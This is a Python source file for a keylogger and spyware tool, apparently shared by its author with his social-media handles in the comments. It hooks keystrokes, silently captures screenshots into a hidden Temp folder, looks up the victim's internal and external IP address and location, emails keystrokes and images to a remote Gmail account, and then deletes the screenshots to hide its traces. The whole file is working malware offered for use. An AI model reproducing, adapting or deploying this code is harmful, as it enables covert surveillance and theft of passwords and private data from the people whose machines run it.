import requests
from bs4 import BeautifulSoup
import pyHook
import pyautogui
import os,sys
import smtplib
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart      #İmporting Modules
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import time
import threading
import socket

# -------- KeyLogger -------- #

def KeyBoard(event):
    list.append(event.WindowName)                               # My Linkedin Account ==> "https://www.linkedin.com/in/erdo%C4%9Fan-yoksul-47897a151/"
    list.append("     0=={:::::::::::::::>     ")               # My Twitter Account ==> "https://twitter.com/YoksulErdogan"
    list.append(event.Key)                                      # My GitHub Account ==> "https://github.com/eredotpkfr"
    list.append("\n")                                           # My İnstagram Account ==> "https://www.instagram.com/eredot41_pk.fr/?hl=tr"
    return True                                                 # Eredot41_PK&FR          0=={:::::::::::::::::::>

# -------- ScreenShot -------- #

def takeScreenShot():
    ss_Number = 1
    ss_Name = 1
    home_dir = ('C://Users//pc//AppData//Local//Temp//system')                 # You Can Change This Path.
    if not os.path.exists(home_dir):
        os.mkdir(home_dir)
    while (ss_Number <= 10):                     # You Can Change This Number To Your Self.
        scs = pyautogui.screenshot()
        scs.save("C://Users//pc//AppData//Local//Temp//system//" + str(ss_Name) + ".png")             # You Can Change This Path.
        ss_Name += 1
        ss_Number += 1
        time.sleep(1)               # There Is Delay(Second).

# -------- Get Machine IP Adress -------- #

def get_Machine_ıp():
    machine_ip = socket.gethostbyname(socket.gethostname())
    list.append("*")
    list.append("Machine IP")
    list.append("     0=={:::::::::::::::>     ")
    list.append(machine_ip)
    list.append("\n")

# -------- External IP Stole -------- #

def external_IP_Stole():
    url = "https://www.chip.com.tr/ip-adresim-nedir"
    rqs = requests.get(url)
    cnt = BeautifulSoup(rqs.content, "html.parser")
    tbl = cnt.find_all("div", {"class": "ipdetaytablo ipinfo"})
    a = (tbl[0].contents)[len(tbl[0].contents) - 12]
    tx = a.text
    f = tx[1:3]
    b = tx[3:16]
    list.append("*")
    list.append(f)
    list.append("     0=={:::::::::::::::>     ")
    list.append(b)
    list.append("\n")

# -------- Location Identify And IP Detail With Using External IP -------- #

    url_2 = "https://whatismyipaddress.com/ip/" + str(b)
    rqs_2 = requests.get(url_2)
    cnt_2 = BeautifulSoup(rqs_2.content, "html.parser")
    div = cnt_2.find_all("div", {"id": "section_left_3rd"})
    for Table in div:
        table_tx = Table.find_all("table")
        for location_tx in table_tx:
            tx_2 = location_tx.text
            list.append(tx_2)
    time.sleep(11)             # There Is Delay(Second).


# -------- Send E-mail -------- #

def send_Email(list):
    email_Sender = "XXXXXXXX@gmail.com"      # There Is Email Sender's Email.
    email_Sender_PASS = "YYYYYYYY"           # There Is Email Sender's Password.
    email_Receiver = "ZZZZZZZZ@gmail.com"    # There Is Email Receiver's Email.
    msg = MIMEMultipart()
    msg['From'] = email_Sender
    msg['To'] = email_Receiver
    msg['Subject'] = "SUBJECT"    # Email's Subject.
    mesaj = msg.as_string()
    msg.preamble = "EMAIL'S PREAMBLE"  # Email's Preamble.
    list_STR = ""
    for lstr in list:
        list_STR = list_STR + "" + lstr
    body = list_STR
    msg.attach(MIMEText(body))
    rsm = 1
    h = 1
    while rsm <= 10:  # You Can Change This Number To Your Self.
        try:
            filename = str(h) + ".png"
            attachment = open("C://Users//pc//AppData//Local//Temp//system//" + str(h) + ".png",
                              "rb")  # You Can Change This Path.
            part = MIMEBase('application', 'octet-stream')
            part.set_payload((attachment).read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
            msg.attach(part)
            rsm += 1
            h += 1
        except FileNotFoundError:
            pass
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email_Sender, email_Sender_PASS)
        text = msg.as_string()
        server.sendmail(email_Sender, email_Receiver, text)
        list = []
        delete_png = 1
        while delete_png <= 10:
            os.remove("C://Users//pc//AppData//Local//Temp//system//" + str(delete_png) + ".png")
            delete_png += 1
    except Exception:
        pass
list = []
hm = pyHook.HookManager()
hm.KeyDown = KeyBoard
hm.HookKeyboard()
function_SS = threading.Timer(1 , takeScreenShot , [])        # You Can Change This Delay.
function_SS.start()
function_external_IP_Stole = threading.Timer(2 , external_IP_Stole , [])          # You Can Change This Delay.
function_external_IP_Stole.start()
function_send_Email = threading.Timer(11 , send_Email, [list])       # You Can Change This Delay.
function_send_Email.start()
function_get_machine_ip = threading.Timer(3 , get_Machine_ıp , [])
function_get_machine_ip.start()


                    # My Twitter Account ==> "https://twitter.com/YoksulErdogan"
                    # My GitHub Account ==> "https://github.com/eredotpkfr"
                    # My İnstagram Account ==> "https://www.instagram.com/eredot41_pk.fr/?hl=tr"
                    # My Linkedin Account ==> "https://www.linkedin.com/in/erdo%C4%9Fan-yoksul-47897a151/"
                    # Eredot41_PK&FR          0=={:::::::::::::::::::>


















